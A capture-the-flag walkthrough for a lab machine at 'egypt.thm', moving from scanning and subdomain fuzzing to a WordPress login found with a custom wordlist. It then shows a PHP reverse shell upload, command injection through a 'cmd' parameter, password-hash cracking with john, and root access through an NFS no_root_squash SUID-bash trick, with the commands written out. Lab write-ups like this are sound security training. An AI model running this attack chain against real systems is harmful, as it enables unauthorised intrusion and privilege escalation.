## I Encourage Everyone To Try Completing The Tasks Without Any Help. Only Use This Sheet If You're Stuck.

## Table of content
- [Task 1 - Welcome in my world](#Task-1---Welcome-in-my-world)
- [Task 2 - Find all the flags](#Task-2---Find-all-the-flags)
- [Task 3 - See you soon](#Task-3---See-you-soon)

# Task 1 - Welcome in my world:
Deploy the machine and connect to our network. 
```
No answer neeeded
```

# Task 2 - Find all the flags:

### Port Scan
* It identified ports `21,22,80,111,2049 and 3306` as open. Running a more detailed scan on found open ports with `nmap` reveals their respective versions.
  ```
  nmap -p- -sS -sV -sC -A -O -T5 <machine-ip> -v 
  ```
  
  ```
  PORT     STATE SERVICE VERSION
  21/tcp   open  ftp     vsftpd 3.0.5
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_Can't get directory listing: TIMEOUT
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.0.2.40
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 3
  |      vsFTPd 3.0.5 - secure, fast, stable
  |_End of status
  22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 34:40:3e:2b:7a:35:be:1c:44:80:95:1f:2b:b9:ae:8e (RSA)
  |   256 1c:48:d7:f4:73:42:3e:7d:6c:5c:be:70:18:bb:21:8e (ECDSA)
  |_  256 ed:c4:fc:21:c0:65:17:60:1a:e7:ad:f5:0b:5e:1a:41 (ED25519)
  80/tcp   open  http    nginx 1.18.0 (Ubuntu)
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  |_http-title: Did not follow redirect to http://egypt.thm/
  111/tcp  open  rpcbind 2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100003  3           2049/udp   nfs
  |   100003  3           2049/udp6  nfs
  |   100003  3,4         2049/tcp   nfs
  |   100003  3,4         2049/tcp6  nfs
  |   100005  1,2,3      32866/udp6  mountd
  |   100005  1,2,3      51103/tcp   mountd
  |   100005  1,2,3      55829/udp   mountd
  |   100005  1,2,3      57883/tcp6  mountd
  |   100021  1,3,4      38361/tcp   nlockmgr
  |   100021  1,3,4      46649/tcp6  nlockmgr
  |   100021  1,3,4      51226/udp   nlockmgr
  |   100021  1,3,4      57375/udp6  nlockmgr
  |   100227  3           2049/tcp   nfs_acl
  |   100227  3           2049/tcp6  nfs_acl
  |   100227  3           2049/udp   nfs_acl
  |_  100227  3           2049/udp6  nfs_acl
  2049/tcp open  nfs     3-4 (RPC #100003)
  3306/tcp open  mysql   MySQL 5.5.5-10.3.39-MariaDB-0ubuntu0.20.04.2
  | mysql-info: 
  |   Protocol: 10
  |   Version: 5.5.5-10.3.39-MariaDB-0ubuntu0.20.04.2
  |   Thread ID: 47
  |   Capabilities flags: 63486
  |   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, FoundRows, ODBCClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, InteractiveClient, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
  |   Status: Autocommit
  |   Salt: L&wHAL9xsZF1auKR>|w`
  |_  Auth Plugin Name: mysql_native_password
  ```

##
### FTP
```
ftp <machine-ip>
```
```
username: You will get it by nmap scanning
password: Same username
```
```
drwxr-xr-x    2 65534    65534        4096 Jan 23 21:28 .
drwxr-xr-x    2 65534    65534        4096 Jan 23 21:28 ..
-rw-r--r--    1 65534    65534         934 Jan 23 23:26 user_passwd.txt
```
* No thing important in this file
  
##
### Web Application Enumeration
* Going to the webpage using the given IP address redirects to `egypt.thm` domain, but fails to open a website.
  
  ```
  80/tcp   open  http    nginx 1.18.0 (Ubuntu)
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  |_http-title: Did not follow redirect to http://egypt.thm/      <<<------------
  ```
  
* Adding the given IP address as `egypt.thm` to the `/etc/hosts` file and reloading a page fixes the error.
  
  ```
  echo "<machine-ip>   egypt.thm" >> /etc/hosts
  ```

##
### Directory Enumeration
* Using `gobuster` tool I was able to find directories on the `nginx` server.
  
  ```
   gobuster dir -u <machine-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e --no-error -t 30
  ```
  ```
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  http://egypt.thm/images               (Status: 301) [Size: 178] [--> http://egypt.thm/images/]
  http://egypt.thm/index                (Status: 301) [Size: 178] [--> http://egypt.thm/index/]
  http://egypt.thm/news                 (Status: 301) [Size: 178] [--> http://egypt.thm/news/]
  http://egypt.thm/about                (Status: 301) [Size: 178] [--> http://egypt.thm/about/]
  http://egypt.thm/contact              (Status: 301) [Size: 178] [--> http://egypt.thm/contact/]
  http://egypt.thm/warez                (Status: 301) [Size: 178] [--> http://egypt.thm/warez/]
  http://egypt.thm/crack                (Status: 301) [Size: 178] [--> http://egypt.thm/crack/]
  http://egypt.thm/download             (Status: 301) [Size: 178] [--> http://egypt.thm/download/]
  http://egypt.thm/2006                 (Status: 301) [Size: 178] [--> http://egypt.thm/2006/]
  http://egypt.thm/12                   (Status: 301) [Size: 178] [--> http://egypt.thm/12/]
  http://egypt.thm/full                 (Status: 301) [Size: 178] [--> http://egypt.thm/full/]
  http://egypt.thm/serial               (Status: 301) [Size: 178] [--> http://egypt.thm/serial/]
  http://egypt.thm/search               (Status: 301) [Size: 178] [--> http://egypt.thm/search/]
  http://egypt.thm/spacer               (Status: 301) [Size: 178] [--> http://egypt.thm/spacer/]
  http://egypt.thm/privacy              (Status: 301) [Size: 178] [--> http://egypt.thm/privacy/]
  http://egypt.thm/blog                 (Status: 301) [Size: 178] [--> http://egypt.thm/blog/]
  http://egypt.thm/new                  (Status: 301) [Size: 178] [--> http://egypt.thm/new/]
  http://egypt.thm/11                   (Status: 301) [Size: 178] [--> http://egypt.thm/11/]
  http://egypt.thm/logo                 (Status: 301) [Size: 178] [--> http://egypt.thm/logo/]
  http://egypt.thm/10                   (Status: 301) [Size: 178] [--> http://egypt.thm/10/]
  http://egypt.thm/cgi-bin              (Status: 301) [Size: 178] [--> http://egypt.thm/cgi-bin/]
  http://egypt.thm/faq                  (Status: 301) [Size: 178] [--> http://egypt.thm/faq/]
  http://egypt.thm/rss                  (Status: 301) [Size: 178] [--> http://egypt.thm/rss/]
  http://egypt.thm/1                    (Status: 301) [Size: 178] [--> http://egypt.thm/1/]
  http://egypt.thm/archives             (Status: 301) [Size: 178] [--> http://egypt.thm/archives/]
  http://egypt.thm/sitemap              (Status: 301) [Size: 178] [--> http://egypt.thm/sitemap/]
  http://egypt.thm/products             (Status: 301) [Size: 178] [--> http://egypt.thm/products/]
  http://egypt.thm/2005                 (Status: 301) [Size: 178] [--> http://egypt.thm/2005/]
  http://egypt.thm/default              (Status: 301) [Size: 178] [--> http://egypt.thm/default/]
  http://egypt.thm/img                  (Status: 301) [Size: 178] [--> http://egypt.thm/img/]
  http://egypt.thm/home                 (Status: 301) [Size: 178] [--> http://egypt.thm/home/]
  http://egypt.thm/links                (Status: 301) [Size: 178] [--> http://egypt.thm/links/]
  http://egypt.thm/01                   (Status: 301) [Size: 178] [--> http://egypt.thm/01/]
  http://egypt.thm/08                   (Status: 301) [Size: 178] [--> http://egypt.thm/08/]
  http://egypt.thm/07                   (Status: 301) [Size: 178] [--> http://egypt.thm/07/]
  http://egypt.thm/06                   (Status: 301) [Size: 178] [--> http://egypt.thm/06/]
  http://egypt.thm/login                (Status: 301) [Size: 178] [--> http://egypt.thm/login/]
  http://egypt.thm/articles             (Status: 301) [Size: 178] [--> http://egypt.thm/articles/]
  http://egypt.thm/support              (Status: 301) [Size: 178] [--> http://egypt.thm/support/]
  http://egypt.thm/article              (Status: 301) [Size: 178] [--> http://egypt.thm/article/]
  http://egypt.thm/keygen               (Status: 301) [Size: 178] [--> http://egypt.thm/keygen/]
  http://egypt.thm/help                 (Status: 301) [Size: 178] [--> http://egypt.thm/help/]
  http://egypt.thm/03                   (Status: 301) [Size: 178] [--> http://egypt.thm/03/]
  http://egypt.thm/04                   (Status: 301) [Size: 178] [--> http://egypt.thm/04/]
  http://egypt.thm/09                   (Status: 301) [Size: 178] [--> http://egypt.thm/09/]
  http://egypt.thm/2                    (Status: 301) [Size: 178] [--> http://egypt.thm/2/]
  http://egypt.thm/05                   (Status: 301) [Size: 178] [--> http://egypt.thm/05/]
  http://egypt.thm/events               (Status: 301) [Size: 178] [--> http://egypt.thm/events/]
  http://egypt.thm/archive              (Status: 301) [Size: 178] [--> http://egypt.thm/archive/]
  http://egypt.thm/02                   (Status: 301) [Size: 178] [--> http://egypt.thm/02/]
  http://egypt.thm/register             (Status: 301) [Size: 178] [--> http://egypt.thm/register/]
  http://egypt.thm/en                   (Status: 301) [Size: 178] [--> http://egypt.thm/en/]
  http://egypt.thm/forum                (Status: 301) [Size: 178] [--> http://egypt.thm/forum/]
  http://egypt.thm/security             (Status: 301) [Size: 178] [--> http://egypt.thm/security/]
  http://egypt.thm/3                    (Status: 301) [Size: 178] [--> http://egypt.thm/3/]
  http://egypt.thm/software             (Status: 301) [Size: 178] [--> http://egypt.thm/software/]
  http://egypt.thm/13                   (Status: 301) [Size: 178] [--> http://egypt.thm/13/]
  http://egypt.thm/downloads            (Status: 301) [Size: 178] [--> http://egypt.thm/downloads/]
  http://egypt.thm/category             (Status: 301) [Size: 178] [--> http://egypt.thm/category/]
  http://egypt.thm/4                    (Status: 301) [Size: 178] [--> http://egypt.thm/4/]
  http://egypt.thm/content              (Status: 301) [Size: 178] [--> http://egypt.thm/content/]
  http://egypt.thm/services             (Status: 301) [Size: 178] [--> http://egypt.thm/services/]
  http://egypt.thm/15                   (Status: 301) [Size: 178] [--> http://egypt.thm/15/]
  http://egypt.thm/main                 (Status: 301) [Size: 178] [--> http://egypt.thm/main/]
  http://egypt.thm/14                   (Status: 301) [Size: 178] [--> http://egypt.thm/14/]
  http://egypt.thm/templates            (Status: 301) [Size: 178] [--> http://egypt.thm/templates/]
  http://egypt.thm/press                (Status: 301) [Size: 178] [--> http://egypt.thm/press/]
  http://egypt.thm/icons                (Status: 301) [Size: 178] [--> http://egypt.thm/icons/]
  http://egypt.thm/media                (Status: 301) [Size: 178] [--> http://egypt.thm/media/]
  http://egypt.thm/assets               (Status: 301) [Size: 178] [--> http://egypt.thm/assets/]
  http://egypt.thm/password             (Status: 301) [Size: 178] [--> http://egypt.thm/password/]
  http://egypt.thm/username             (Status: 301) [Size: 178] [--> http://egypt.thm/username/]
  Progress: 220560 / 220561 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
* After scanning all these directory I did not find any thing important. All directory have `.html` empty file
##
### Subdomain Listing
* Using `ffuf` tool, I found three subdomains for the webpage.
  
  ```
  ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.egypt.thm" -u http://<machine-ip> -fw <number-of-words>
  ```
  ```
   admin                   [Status: 200, Size: 800, Words: 69, Lines: 25, Duration: 3ms]
   wordpress               [Status: 200, Size: 25403, Words: 1183, Lines: 328, Duration: 113ms]
   gift                    [Status: 200, Size: 419, Words: 50, Lines: 15, Duration: 5ms]
  ```
* Main pages on these subdomains were inaccessible, so I added the subdomains to `/etc/hosts`

  ```
  echo "admin.egypt.thm" >> /etc/hosts
  echo "wordpress.egypt.thm" >> /etc/hosts
  echo "gift.egypt.thm" >> /etc/hosts
  ```
##
### Subdomain Enumeration
- [admin](#admin)
- [wordpress](#wordpress)
- [gift](#gift)
  ##
#### admin
 * I found a login page.
 * After enumeration, I found the username and password in the JavaScript file.
 * After login, not found anything important.
   ##
#### wordpress
 * I found a WordPress page.
 * After enumeration by using `wpscan` , I found a login WordPress page and username.
   ```
   username: Egypt
   http://wordpress.egypt.thm/wp-login.php?redirect_to=http%3A%2F%2Fwordpress.egypt.thm%2Fwp-admin%2F&reauth=1
   ```
   
 * I tried to do brute force by using the `rockyou.txt` file to get a password but, not I did find any things.
 * When When I got back to room hint I found him he said `Don't be ordinary in all your tests, but be innovative` Then I thought about making my password file, then I used`cewl`. And indeed i found password.
   ```
   cewl  -w password.txt http://egypt.thm
   ```

 * After that i get into `blogin` and i put `php reverse shell` And indeed i get into machine by this url.
   ```
   http://wordpress.egypt.thm/wp-content/plugins/akismet/index.php
   ```

 * After a long search on machines. I didn't find anything important, but I remember on port scaning I found port `3306` is open and it  this port I can get into databases and probably can find any think important.
   ```
   3306/tcp open  mysql   MySQL 5.5.5-10.3.39-MariaDB-0ubuntu0.20.04.2
   ```

 * So now we should find config file in wordpress folder to get username and password to login into databases.
 * And indeed i found into this path `/var/www/wordpress.egypt.thm/wc-config.php`
 * Now, let's login into databases by using user/password which i got by this command
   ```
   mysql -u <username> -h <machine_ip> -P 3306 -p
   ```

 * Now i have found `WordPress `databases and after getting into them, i are found `users` tables and after open user tables i find `mohamed` user, and i are found password hash. Now let's crack hash by using `johan`
   ```
   john --wordlist=/usr/share/wordlists/rockyou.txt <hash_file>
   ```

 * And indeed i have a password and  after to try login into ssh by using username and password that i got them. and indeed i have successful login
   ##
#### gift
 * I found the page had a box and when scanning the HTML code of the page I found that when click into box it redirected to a new directory.
 * This new page not have anything like the page before it
 * But I noticed that the web page was formatted as `.php`. Then I decided to scan this page by using `ffuf`
   ```
   ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "<url_of_page>?FUZZ=id" -fw <numper_of_word>
   ```

 * And indeed i found `cmd`
 * Let's put reverse shell code to get access into machine. but i found it redirect me to another page every i put any reverse shell and i think it filtering any input
 * If i use `cat` or `ls` command it allow to executing it and it give me output
 * Now lets get WordPress config to log into databases
 * We repeat what happened in wordpress
##
### privilege Escalation
* During the examination we found `nfs`
  ```
  2049/tcp open  nfs     3-4 (RPC #100003)
  ```
* After cat `/etc/exports` file. i found nfs path.
  ```
  /var/nfs/admin *(rw,sync,insecure,no_root_squash,no_subtree_check)
  ```
* nfs has no_root_squash flag then let's attack nfs
* server is (`tryhackme-machine`)
* client is (`your-machine`)
  ```
  client
  
  cd /mnt
  mkdir exploit
  mount -o rw <machine_ip>:/var/nfs/admin /mnt/exploit/
  ```
  ```
  server

  cp /bin/bash .
  ```
  ```
  client

  chown root:root bash
  chmod +xs bash
  ```
  ```
  server

  /var/nfs/admin/bash -p
  ```
  ##
What is the user flag?
  ```
  ***{***********************}
  ```
What is the root flag?
  ```
  ***{************************************}
  ```
##
# Task 3 - See you soon:
  * This is my first CTF machine and I hope you enjoyed it.
  
  * Your opinion is important to me, so this is my post in LinkedIn:
  
  * Make a comment and tell me what's your opinion.
  
  Thanks...
##

See you soon
```
No answer neeeded
```
